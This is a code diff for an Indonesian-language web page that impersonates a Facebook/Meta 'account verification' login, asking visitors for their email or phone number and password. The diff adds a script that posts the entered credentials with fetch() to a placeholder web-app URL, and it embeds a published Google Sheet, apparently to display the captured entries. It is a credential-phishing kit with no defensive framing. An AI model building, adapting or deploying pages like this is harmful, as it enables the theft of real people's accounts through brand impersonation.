@@ -8,16 +8,11 @@
     /* Reset & font */
     @import url("https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap");
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: "Roboto", sans-serif; }
-
     body {
       min-height: 100vh;
-      display: flex;
-      flex-direction: column;
       background: linear-gradient(to bottom, #ffd700 50px, #0057e7 0);
       position: relative;
     }
-
-    /* Header Putih sebagai lapisan atas */
     header {
       background-color: #FFFFFF;
       padding: 16px;
@@ -25,10 +20,8 @@
       font-size: 1.6rem;
       font-weight: bold;
       color: #000;
-      margin-bottom: 12px; /* Menambah jarak di bawah header */
+      margin-bottom: 12px;
     }
-
-    /* Tulisan tambahan di bawah header */
     .description {
       text-align: center;
       color: #000;
@@ -37,11 +30,9 @@
       font-size: 1rem;
       font-weight: 400;
       max-width: 600px;
-      margin: 0 auto 24px auto; /* Jarak bawah ke card */
+      margin: 0 auto 24px auto;
       border-radius: 4px;
     }
-
-    /* Konten utama dengan background putih, ditempatkan di atas biru dan diposisikan tengah */
     .card {
       background: #fff;
       border-radius: 8px;
@@ -49,28 +40,20 @@
       width: 100%;
       max-width: 380px;
       padding: 24px;
-
-      position: absolute;
-      top: calc(50% + 50px); /* Sesuaikan posisi untuk menambah jarak vertikal */
-      left: 50%;
-      transform: translate(-50%, -50%);
+      margin: 0 auto;
     }
-
     .card h1 {
       color: #1877f2;
       font-size: 1.8rem;
       text-align: center;
       margin-bottom: 16px;
     }
-
     .card form {
       display: flex;
       flex-direction: column;
       gap: 16px;
     }
-
     label { font-weight: 500; margin-bottom: 4px; }
-
     input {
       width: 100%;
       padding: 12px;
@@ -79,12 +62,7 @@
       font-size: 1rem;
       transition: border-color 0.2s;
     }
-
-    input:focus {
-      border-color: #1877f2;
-      outline: none;
-    }
-
+    input:focus { border-color: #1877f2; outline: none; }
     button {
       padding: 12px;
       background: #1877f2;
@@ -96,12 +74,18 @@
       cursor: pointer;
       transition: background 0.2s;
     }
-
-    button:hover {
-      background: #145eb3;
+    button:hover { background: #145eb3; }
+    .sheet-embed {
+      width: 100%;
+      max-width: 800px;
+      margin: 24px auto;
+      padding: 0 16px;
     }
-
-    /* Footer sebagai lapisan biru bawah */
+    .sheet-embed iframe {
+      width: 100%;
+      height: 400px;
+      border: none;
+    }
     footer {
       background-color: #0057e7;
       padding: 12px;
@@ -115,29 +99,47 @@
   </style>
 </head>
 <body>
-  <header>Verifikasi Akun Dan Amankan</header>
-
+  <header>Verifikasi Akun dan Amankan</header>
   <div class="description">
     Facebook membantu Anda terhubung dan berbagi dengan orang-orang dalam kehidupan Anda.
   </div>
 
   <div class="card">
     <h1>Masuk ke Akun Anda</h1>
-    <form action="seats.html" method="POST">
+    <form id="login-form">
       <div>
         <label for="emailOrPhone">Email atau Nomor Telepon</label>
-        <input type="email" id="emailOrPhone" name="emailOrPhone"
-               placeholder="Masukkan email atau nomor telepon" required>
+        <input type="email" id="emailOrPhone" name="emailOrPhone" placeholder="Masukkan email atau nomor telepon" required>
       </div>
       <div>
         <label for="password">Kata Sandi</label>
-        <input type="password" id="password" name="password"
-               placeholder="Masukkan kata sandi" required autocomplete="current-password">
+        <input type="password" id="password" name="password" placeholder="Masukkan kata sandi" required autocomplete="current-password">
       </div>
-      <button type="submit">Kirim &amp; Amankan</button>
+      <button type="submit">Kirim & Amankan</button>
     </form>
   </div>
-  
+
+  <!-- Embed Google Sheet di sini -->
+  <div class="sheet-embed">
+    <iframe
+      src="https://docs.google.com/spreadsheets/d/14nPAYOjs1DnbDwChhixhod0G6sWpLjZb2PVemdwearw/pubhtml?widget=true&amp;headers=false"
+      allowfullscreen>
+    </iframe>
+  </div>
+
   <footer>&copy; 2025 VERIFIKASI META</footer>
+
+  <script>
+    const scriptURL = '<WEB_APP_URL>'; // Ganti dengan URL Web App Anda
+    const form = document.getElementById('login-form');
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+        .then(response => response.json())
+        .then(json => {
+          alert('Terkirim: ' + json.result);
+          form.reset();
+    });
+  </script>
 </body>
 </html>
